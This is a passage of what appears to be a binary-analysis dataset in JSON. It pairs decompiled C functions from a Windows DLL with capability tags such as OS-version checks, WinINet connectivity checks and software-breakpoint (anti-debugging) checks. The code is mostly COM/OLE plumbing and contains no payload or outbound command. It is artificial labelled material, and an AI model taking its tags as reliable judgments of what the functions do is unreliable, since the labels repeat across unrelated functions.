            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001d284(int64_t arg1)\n\n{\n    ulong in_RDX;\n    ulong in_R8;\n    \n    if (*(arg1 + 0x10) == 0) {\n        fcn.18001d22c(arg1, in_RDX, in_R8);\n    }\n    else {\n        (****(arg1 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "18001d17": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18001d178(int64_t pvarg)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (*(pvarg + 0x10) == 0) {\n        LOCK();\n        piVar1 = pvarg + 8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + 1;\n        uVar3 = iVar2 + 1;\n    }\n    else {\n        uVar3 = (**(**(pvarg + 0x10) + 8))();\n    }\n    return uVar3;\n}\n",
        "token_count": 142
    },
    "18001d20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001d208(int64_t psa)\n\n{\n    if (*(psa + 0x10) == 0) {\n        fcn.18001d1a0(psa);\n    }\n    else {\n        (**(**(psa + 0x10) + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "18000a26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000a26c(int64_t **arg1)\n\n{\n    int64_t **lpMem;\n    int64_t *piVar1;\n    \n    piVar1 = *arg1;\n    while (piVar1 != NULL) {\n        lpMem = *arg1;\n        *arg1 = *lpMem;\n        fcn.18003342c(lpMem);\n        piVar1 = *arg1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "18000a4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18000a4fc(int64_t *arg1, int32_t *arg2, ulong arg3, int64_t **arg4)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t *arg2_00;\n    int64_t *arg2_01;\n    int64_t *arg2_02;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t *piStackX32;\n    int64_t iStack120;\n    int64_t iStack112;\n    int64_t iStack104;\n    int64_t *piStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    int64_t iStack72;\n    ulong uStack64;\n    \n    uStack64 = 0xfffffffffffffffe;\n    uVar7 = 0;\n    piStack80 = NULL;\n    piStack88 = NULL;\n    piStackX32 = NULL;\n    piStack96 = NULL;\n    iStack120 = 0;\n    iStack112 = 0;\n    iStack104 = 0;\n    uVar5 = 0xffffffff;\n    uVar9 = 0xffffffff;\n    if (arg4 == NULL) {\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(0);\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack112);\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack120);\n        if (piStack96 != NULL) {\n            (**(*piStack96 + 0x10))();\n        }\n        if (piStackX32 != NULL) {\n            (**(*piStackX32 + 0x10))();\n        }\n        if (piStack88 != NULL) {\n            (**(*piStack88 + 0x10))();\n        }\n        if (piStack80 != NULL) {\n            (**(*piStack80 + 0x10))();\n        }\n        uVar5 = 0x80004003;\n    }\n    else {\n        *arg4 = NULL;\n        if (arg2 != NULL) {\n            (**(*arg1 + 0x48))(arg1, &piStack96);\n            uVar3 = uVar5;\n            if ((((piStack96 != NULL) &&\n                 ((**(*piStack96 + 0x360))(piStack96, &piStack80),  uVar3 = uVar9,  piStack80 != NULL)) &&\n                (iVar4 = (**(*piStack80 + 0x1a8))(piStack80, &piStack88),  -1 < iVar4)) && (piStack88 != NULL)) {\n                (**(*piStack88 + 0x38))(piStack88, &piStackX32);\n                *arg4 = piStackX32;\n                if (piStackX32 != NULL) {\n                    (**(*piStackX32 + 8))();\n                }\n                iStack72 = 0;\n                iVar4 = *arg2;\n                piVar6 = arg2;\n                uVar5 = uVar7;\n                arg2_01 = piStackX32;\n                arg2_00 = piStackX32;\n                arg2_02 = piStackX32;\n                while (iVar4 != 5) {\n                    if (piVar6[1] == arg3) {\n                        uVar8 = uVar7;\n                        if (*piVar6 == 0) {\n                            if (iStack120 == 0) {\n                                if (piStackX32 != NULL) {\n                                    (**(*piStackX32 + 0x68))(piStackX32, &iStack120);\n                                    if (iStack120 != 0) goto code_r0x00018000a6ca;\n                                    goto code_r0x00018000a702;\n                                }\ncode_r0x00018000a70d:\n                                bVar2 = true;\n                            }\n                            else {\ncode_r0x00018000a6ca:\n                                if (*(piVar6 + 2) != 0) {\n                                    arg2_00 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                                    if (arg2_00 == NULL) {\n                                        fcn.180001214(0x8007000e);\n                                        pcVar1 = swi(3);\n                                        uVar5 = (*pcVar1)();\n                                        return uVar5;\n                                    }\n                                    uVar7 = uVar8 | 1;\n                                    iVar4 = fcn.180034e80(iStack120, arg2_00);\n                                    if (iVar4 == 0) goto code_r0x00018000a70d;\n                                }\n                                if (iStack120 == 0) {\ncode_r0x00018000a702:\n                                    if (piStackX32 == NULL) goto code_r0x00018000a70d;\n                                }\n                                bVar2 = false;\n                            }\n                            if ((uVar7 & 1) != 0) {\n                                uVar7 = uVar7 & 0xfffffffe;\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg2_00);\n                            }\n                        }\n                        else if (*piVar6 == 1) {\n                            if ((iStack112 == 0) &&\n                               ((piStackX32 == NULL ||\n                                ((**(*piStackX32 + 0x58))(piStackX32, &iStack112),  iStack112 == 0)))) {\ncode_r0x00018000a7a9:\n                                bVar2 = false;\n                            }\n                            else {\n                                if (*(piVar6 + 2) == 0) {\n                                    arg2_01 = NULL;\n                                }\n                                else {\n                                    arg2_01 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                                    if (arg2_01 == NULL) {\n                                        fcn.180001214(0x8007000e);\n                                        pcVar1 = swi(3);\n                                        uVar5 = (*pcVar1)();\n                                        return uVar5;\n                                    }\n                                }\n                                uVar7 = uVar8 | 2;\n                                iVar4 = fcn.180034e80(iStack112, arg2_01);\n                                if (iVar4 != 0) goto code_r0x00018000a7a9;\n                                bVar2 = true;\n                            }\n                            if ((uVar7 & 2) != 0) {\n                                uVar7 = uVar7 & 0xfffffffd;\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg2_01);\n                            }\n                        }\n                        else {\n                            if (*piVar6 != 2) goto code_r0x00018000a863;\n                            if ((iStack104 == 0) &&\n                               ((piStackX32 == NULL ||\n                                ((**(*piStackX32 + 0x70))(piStackX32, &iStack104),  iStack104 == 0)))) {\ncode_r0x00018000a840:\n                                bVar2 = false;\n                            }\n                            else {\n                                if (*(piVar6 + 2) == 0) {\n                                    arg2_02 = NULL;\n                                }\n                                else {\n                                    arg2_02 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                                    if (arg2_02 == NULL) {\n                                        fcn.180001214(0x8007000e);\n                                        pcVar1 = swi(3);\n                                        uVar5 = (*pcVar1)();\n                                        return uVar5;\n                                    }\n                                }\n                                uVar7 = uVar8 | 4;\n                                iVar4 = fcn.180034c04(iStack104, arg2_02);\n                                if (iVar4 != 0) goto code_r0x00018000a840;\n                                bVar2 = true;\n                            }\n                            if ((uVar7 & 4) != 0) {\n                                uVar7 = uVar7 & 0xfffffffb;\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg2_02);\n                            }\n                        }\n                        if (bVar2) {\n                            uVar3 = uVar5;\n                            if (uVar5 != -1) goto code_r0x00018000a8d4;\n                            break;\n                        }\n                    }\ncode_r0x00018000a863:\n                    uVar5 = uVar5 + 1;\n                    iStack72 = iStack72 + 1;\n                    piVar6 = arg2 + iStack72 * 8;\n                    iVar4 = *piVar6;\n                }\n            }\n            uVar5 = uVar3;\n            if (*arg4 != NULL) {\n                (**(**arg4 + 0x10))();\n                *arg4 = NULL;\n            }\n        }\ncode_r0x00018000a8d4:\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack104);\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack112);\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack120);\n        if (piStack96 != NULL) {\n            (**(*piStack96 + 0x10))();\n        }\n        if (piStackX32 != NULL) {\n            (**(*piStackX32 + 0x10))();\n        }\n        if (piStack88 != NULL) {\n            (**(*piStack88 + 0x10))();\n        }\n        if (piStack80 != NULL) {\n            (**(*piStack80 + 0x10))();\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 2114
    },
    "18000b84": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.18000b84c(ulong *arg1, ulong *arg2, ulong *arg3, ushort *arg4)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ushort *in_stack_00000028;\n    uchar auStack216 [32];\n    int64_t *piStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    int64_t *piStack160;\n    int64_t *piStack152;\n    int64_t *piStack144;\n    int64_t *piStack136;\n    int32_t iStack128;\n    uint uStack124;\n    int64_t *piStack120;\n    int64_t iStack112;\n    int64_t iStack104;\n    uchar auStack96 [16];\n    uint64_t uStack80;\n    \n    uVar3 = *0x180056040;\n    uVar2 = *0x180056038;\n    uStack80 = *0x180067ce0 ^ auStack216;\n    iVar6 = 0;\n    if ((((arg2 != NULL) && (arg3 != NULL)) && (arg4 != NULL)) && (in_stack_00000028 != NULL)) {\n        *arg2 = *0x180056038;\n        arg2[1] = uVar3;\n        uVar4 = *0x180056040;\n        uVar3 = *0x180056038;\n        *arg3 = *0x180056038;\n        arg3[1] = uVar4;\n        *arg4 = 0;\n        *in_stack_00000028 = 0;\n        if (arg1 != NULL) {\n            piStack136 = NULL;\n            iVar5 = (***arg1)(uVar2, uVar3, arg1, 0x180056018, &piStack136);\n            if (-1 < iVar5) {\n                piStack144 = NULL;\n                iVar5 = (**(*piStack136 + 0x20))(piStack136, 0, 0, &piStack144);\n                if (-1 < iVar5) {\n                    piStack168 = NULL;\n                    iVar5 = (**(*piStack144 + 0x90))(piStack144, &piStack168, 0);\n                    if ((-1 < iVar5) && (iVar5 = (**(*piStack168 + 0x38))(piStack168, &iStack112),  -1 < iVar5)) {\n                        iVar5 = fcn.180034220(arg2, 0x10, iStack112, 0x10);\n                        if (iVar5 != 0) {\n                            if (iVar5 == 0xc) {\n                                fcn.1800124cc();\n                                pcVar1 = swi(3);\n                                (*pcVar1)();\n                                return;\n                            }\n                            if ((iVar5 == 0x16) || (iVar5 == 0x22)) {\n                                fcn.180012514();\n                                pcVar1 = swi(3);\n                                (*pcVar1)();\n                                return;\n                            }\n                            if (iVar5 != 0x50) {\n                                fcn.180012514();\n                                pcVar1 = swi(3);\n                                (*pcVar1)();\n                                return;\n                            }\n                        }\n                        *arg4 = *(iStack112 + 0x18);\n                        *in_stack_00000028 = *(iStack112 + 0x1a);\n                        (**(*piStack168 + 0x60))();\n                        piStack120 = NULL;\n                        iVar5 = (***arg1)(arg1, 0x180056188, &piStack120);\n                        if ((iVar5 < 0) || (piStack120 == NULL)) {\n                            piStack184 = NULL;\n                            piStack152 = NULL;\n                            iVar5 = (***arg1)(arg1, 0x18004d430, &piStack152);\n                            if ((-1 < iVar5) &&\n                               ((iVar5 = (**(*piStack152 + 0x18))(piStack152, auStack96),  -1 < iVar5 &&\n                                (iVar5 = (**(*piStack168 + 0x30))(piStack168, auStack96, &piStack184),  -1 < iVar5)))) {\n                                iStack176 = 0;\n                                (**(*piStack184 + 0x18))(piStack184, &iStack176);\n                                if (iStack176 != 0) {\n                                    if (*(iStack176 + 0x34) != 0) {\n                                        do {\n                                            iVar5 = (**(*piStack184 + 0x48))(piStack184, iVar6, &iStack128);\n                                            if ((-1 < iVar5) && (iStack128 == 3)) {\n                                                iVar6 = (**(*piStack184 + 0x40))(piStack184, iVar6, &uStack124);\n                                                if (-1 < iVar6) {\n                                                    piStack160 = NULL;\n                                                    iVar6 = (**(*piStack184 + 0x70))(piStack184, uStack124, &piStack160)\n                                                    ;\n                                                    if ((-1 < iVar6) &&\n                                                       ((**(*piStack160 + 0x18))(piStack160, &iStack104), \n                                                       iStack104 != 0)) {\n                                                        iVar6 = fcn.180034220(arg3, 0x10, iStack104, 0x10);\n                                                        if (iVar6 != 0) {\n                                                            if (iVar6 == 0xc) {\n                                                                fcn.1800124cc();\n                                                                pcVar1 = swi(3);\n                                                                (*pcVar1)();\n                                                                return;\n                                                            }\n                                                            if ((iVar6 == 0x16) || (iVar6 == 0x22)) {\n                                                                fcn.180012514();\n                                                                pcVar1 = swi(3);\n                                                                (*pcVar1)();\n                                                                return;\n                                                            }\n                                                            if (iVar6 != 0x50) {\n                                                                fcn.180012514();\n                                                                pcVar1 = swi(3);\n                                                                (*pcVar1)();\n                                                                return;\n                                                            }\n                                                        }\n                                                        (**(*piStack160 + 0x98))(piStack160, iStack104);\n                                                    }\n                                                    if (piStack160 != NULL) {\n                                                        (**(*piStack160 + 0x10))();\n                                                    }\n                                                }\n                                                break;\n                                            }\n                                            iVar6 = iVar6 + 1;\n                                        } while (iVar6 < *(iStack176 + 0x34));\n                                    }\n                                    (**(*piStack184 + 0x98))(piStack184, iStack176);\n                                }\n                            }\n                            if (piStack152 != NULL) {\n                                (**(*piStack152 + 0x10))();\n                            }\n                            if (piStack184 != NULL) {\n                                (**(*piStack184 + 0x10))();\n                            }\n                        }\n                        else {\n                            (**(*piStack120 + 0x20))(piStack120, 1, arg3);\n                        }\n                        if (piStack120 != NULL) {\n                            (**(*piStack120 + 0x10))();\n                        }\n                    }\n                    if (piStack168 != NULL) {\n                        (**(*piStack168 + 0x10))();\n                    }\n                }\n                if (piStack144 != NULL) {\n                    (**(*piStack144 + 0x10))();\n                }\n            }\n            if (piStack136 != NULL) {\n                (**(*piStack136 + 0x10))();\n            }\n        }\n    }\n    fcn.180032ea0(uStack80 ^ auStack216);\n    return;\n}\n",
        "token_count": 1653
    },
    "18000c81": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18000c810(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    ulong *puVar2;\n    uchar auStack24 [16];\n    \n    fcn.180010300(0);\n    fcn.1800119f4(arg1);\n    (*_sym.imp.USER32.dll_GetClientRect)(arg1[8], auStack24);\n    if (arg1[0x16] == 0) {\n        fcn.18001bd90(arg1, arg1[0x25]);\n    }\n    arg1_00 = fcn.18001bcac(arg1, 0x66);\n    if (((arg1_00 != 0) && (puVar2 = fcn.18001bc6c(arg1_00),  puVar2 != NULL)) &&\n       (iVar1 = (***puVar2)(puVar2),  -1 < iVar1)) {\n        fcn.180017ca8(arg1 + 0x26, *(arg1_00 + 0x40));\n        *(arg1 + 0x124) = 1;\n    }\n    if (arg1[0x22] == 0) {\n        fcn.180027d90(arg1 + 0x26, 0x180056138, 0, 0x50000000);\n        puVar2 = fcn.18001bc6c(arg1 + 0x26);\n        iVar1 = (***puVar2)(puVar2);\n        if (iVar1 < 0) {\n            (**(arg1[0x26] + 0xc0))(arg1 + 0x26);\n            (**(*arg1 + 0xc0))(arg1);\n            return 1;\n        }\n    }\n    if (*(arg1 + 0x21) == 0) {\n        if (arg1[0x20] == 0) {\n            if (arg1[0x1f] != 0) {\n                fcn.18000b11c(arg1, arg1[0x1f], 0, 0);\n            }\n        }\n        else {\n            fcn.18000c520(arg1, arg1[0x20]);\n        }\n    }\n    else {\n        fcn.18000c63c(arg1, *(arg1 + 0x21));\n    }\n    return 1;\n}\n",
        "token_count": 525
    },
    "18000cc2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18000cc2c(int64_t arg1, int64_t arg2, int64_t **arg3, uint *arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t *piStackX24;\n    int64_t *piStack168;\n    int64_t *piStack160;\n    int64_t *piStack152;\n    int64_t iStack144;\n    ushort uStack136;\n    unkbyte6 Stack134;\n    int64_t iStack128;\n    ulong uStack120;\n    ulong uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack40;\n    int64_t iStack32;\n    ulong uStack24;\n    \n    uStack88 = 0xfffffffffffffffe;\n    if (arg3 == NULL) {\n        fcn.180012514();\n        pcVar3 = swi(3);\n        uVar5 = (*pcVar3)();\n        return uVar5;\n    }\n    piStack160 = NULL;\n    piStack168 = NULL;\n    piStackX24 = NULL;\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack136);\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&uStack112);\n    piStack152 = NULL;\n    *arg3 = NULL;\n    if (arg4 != NULL) {\n        *arg4 = 0;\n    }\n    uVar4 = (**(*(arg1 + 0xe8) + 0x48))(arg1 + 0xe8, &piStack152);\n    if (piStack152 == NULL) {\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack112);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack136);\n        if (piStackX24 != NULL) {\n            (**(*piStackX24 + 0x10))();\n        }\n        if (piStack168 != NULL) {\n            (**(*piStack168 + 0x10))();\n        }\n        if (piStack160 == NULL) {\n            return uVar4;\n        }\n        (**(*piStack160 + 0x10))();\n        return uVar4;\n    }\n    if (arg2 == 0) {\n        (**(*piStack152 + 0x10))();\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack112);\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack136);\n        if (piStackX24 != NULL) {\n            (**(*piStackX24 + 0x10))();\n        }\n        if (piStack168 != NULL) {\n            (**(*piStack168 + 0x10))();\n        }\n        if (piStack160 != NULL) {\n            (**(*piStack160 + 0x10))();\n        }\n        return 0x80070057;\n    }\n    fcn.1800087c4(&iStack144, arg2);\n    uStack136 = 8;\n    iStack128 = (*_sym.imp.OLEAUT32.dll_SysReAllocStringLen)(iStack144, *(iStack144 + -0x10));\n    if (iStack128 == 0) {\n        fcn.180009098();\n        pcVar3 = swi(3);\n        uVar5 = (*pcVar3)();\n        return uVar5;\n    }\n    uVar5 = (**(*piStack152 + 0x40))(piStack152, &piStack160);\n    uVar5 = uVar5 & 0xffffffff;\n    if (piStack160 != NULL) {\n        uStack72 = uStack112;\n        uStack64 = uStack104;\n        uStack56 = uStack96;\n        uStack40 = CONCAT62(Stack134, uStack136);\n        iStack32 = iStack128;\n        uStack24 = uStack120;\n        uVar5 = (**(*piStack160 + 0x58))(piStack160, &uStack40, &uStack72, &piStackX24);\n        uVar5 = uVar5 & 0xffffffff;\n        if (piStackX24 == NULL) {\n            uVar5 = 0x80004002;\n            goto code_r0x00018000ce8d;\n        }\n        (***piStackX24)(piStackX24, 0x18004daf8, &piStack168);\n        if ((piStack168 != NULL) && (arg4 != NULL)) {\n            *arg4 = 1;\n        }\n    }\n    if ((-1 < uVar5) && (*arg3 = piStackX24,  piStackX24 != NULL)) {\n        (**(*piStackX24 + 8))();\n    }\ncode_r0x00018000ce8d:\n    LOCK();\n    piVar1 = iStack144 + -8;\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 + -1 < 1) {\n        (**(**(iStack144 + -0x18) + 8))();\n    }\n    if (piStack152 != NULL) {\n        (**(*piStack152 + 0x10))();\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack112);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&uStack136);\n    if (piStackX24 != NULL) {\n        (**(*piStackX24 + 0x10))();\n    }\n    if (piStack168 != NULL) {\n        (**(*piStack168 + 0x10))();\n    }\n    if (piStack160 != NULL) {\n        (**(*piStack160 + 0x10))();\n    }\n    return uVar5;\n}\n",
        "token_count": 1310
    },
    "18000d13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18000d13c(int64_t arg1, ulong arg2, uint64_t arg3, int64_t *arg4)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint64_t arg2_00;\n    uint32_t uVar3;\n    ushort *puVar4;\n    int64_t *piStackX8;\n    int32_t in_stack_00000028;\n    ushort auStack80 [4];\n    uint64_t uStack72;\n    uchar auStack56 [32];\n    \n    piStackX8 = NULL;\n    (**(*(arg1 + 0xe8) + 0x48))(arg1 + 0xe8, &piStackX8, arg3, arg4, 0xfffffffffffffffe);\n    if (piStackX8 != NULL) {\n        (*_sym.imp.OLEAUT32.dll_VariantClear)(auStack80);\n        if (in_stack_00000028 == 0) {\n            iVar1 = *arg4;\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack80);\n            auStack80[0] = 8;\n            uStack72 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n            if ((uStack72 == 0) && (iVar1 != 0)) {\n                auStack80[0] = 10;\n                uStack72 = 0x8007000e;\n                fcn.180001214(0x8007000e);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18000d078(arg1, arg2, arg3 & 0xffffffff, auStack80);\n        }\n        else {\n            puVar4 = fcn.18000cfb8(arg1, auStack56, arg2, arg3 & 0xffffffff);\n            if ((auStack80 != puVar4) &&\n               (uVar3 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(auStack80, puVar4),  uVar3 < 0)) {\n                auStack80[0] = 10;\n                uStack72 = uStack72 & 0xffffffff00000000 | uVar3;\n                fcn.180001214(uVar3);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(auStack80, auStack80, 0, 8);\n            arg2_00 = uStack72;\n            if (uStack72 == 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = fcn.180033b84(uStack72);\n            }\n            fcn.180008dfc(arg4, arg2_00, uVar3);\n        }\n        (*_sym.imp.OLEAUT32.dll_VariantCopy)(auStack80);\n        if (piStackX8 != NULL) {\n            (**(*piStackX8 + 0x10))();\n        }\n    }\n    return;\n}\n",
        "token_count": 676
    },
    "18000d41": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint64_t fcn.18000d414(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t *arg2_00;\n    int64_t iVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t *piStack136;\n    int64_t *piStack128;\n    int64_t *piStack120;\n    int64_t iStack112;\n    uint64_t uStack104;\n    int64_t iStack88;\n    ulong uStack80;\n    \n    uStack80 = 0xfffffffffffffffe;\n    uVar3 = 0;\n    uVar4 = (**(*(arg1 + 0xe8) + 0x38))();\n    if (uVar4 != 0) {\n        iVar7 = 0;\n        uStack104 = uVar4;\n        while (iVar6 = iVar7 * 0x20,  *(iVar6 + uVar4) != 5) {\n            if (*(iVar6 + uVar4) == 3) {\n                piStack136 = NULL;\n                fcn.18000cc2c(arg1, *(iVar6 + 8 + uVar4), &piStack136, 0);\n                piVar1 = piStack136;\n                if ((piStack136 != NULL) && (iVar2 = fcn.18000b2ec(arg1, piStack136),  iVar2 == 0)) {\n                    piStack128 = NULL;\n                    iVar6 = fcn.180009660(0x20);\n                    if (iVar6 == 0) {\n                        arg2_00 = NULL;\n                    }\n                    else {\n                        if (arg1 == 0) {\n                            iVar5 = 0;\n                        }\n                        else {\n                            iVar5 = arg1 + 0xe8;\n                        }\n                        arg2_00 = fcn.18000aba0(iVar6, iVar5, piVar1);\n                    }\n                    piStack128 = arg2_00;\n                    if (arg2_00 == NULL) {\n                        (**(*piVar1 + 0x10))(piVar1);\n                        return 0x8007000e;\n                    }\n                    uVar3 = fcn.18000b44c(piVar1, arg2_00, 0x180056018, arg2_00 + 3);\n                    if (uVar3 < 0) {\n                        (**(*arg2_00 + 0x38))(arg2_00, 1);\n                    }\n                    else {\n                        fcn.18000b3a8(arg1 + 0x1f0, &piStack128);\n                    }\n                }\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x10))(piVar1);\n                }\n            }\n            else if ((*(iVar6 + uVar4) == 4) && (iVar2 = fcn.18000a448(arg1, *(iVar6 + 8 + uVar4)),  iVar2 == 0)) {\n                piStack120 = NULL;\n                fcn.18000cc2c(arg1, *(iVar6 + 8 + uVar4), &piStack120, 0);\n                piVar1 = piStack120;\n                if (piStack120 != NULL) {\n                    piStack136 = NULL;\n                    (***piStack120)(piStack120, 0x18004cfe0);\n                    if (piStack136 != NULL) {\n                        piStack128 = NULL;\n                        (**(*piStack136 + 0x38))(piStack136, &piStack128);\n                        if (piStack128 != NULL) {\n                            iStack112 = 0;\n                            iStack88 = fcn.180009660(0x60);\n                            if (iStack88 == 0) {\n                                iStack112 = 0;\n                            }\n                            else {\n                                if (arg1 == 0) {\n                                    iVar5 = 0;\n                                }\n                                else {\n                                    iVar5 = arg1 + 0xe8;\n                                }\n                                iStack112 = fcn.18000c2cc(iStack88, piStack128, iVar5, *(iVar6 + 8 + uVar4));\n                            }\n                            if (iStack112 == 0) {\n                                if (piStack128 != NULL) {\n                                    (**(*piStack128 + 0x10))();\n                                }\n                                if (piStack136 != NULL) {\n                                  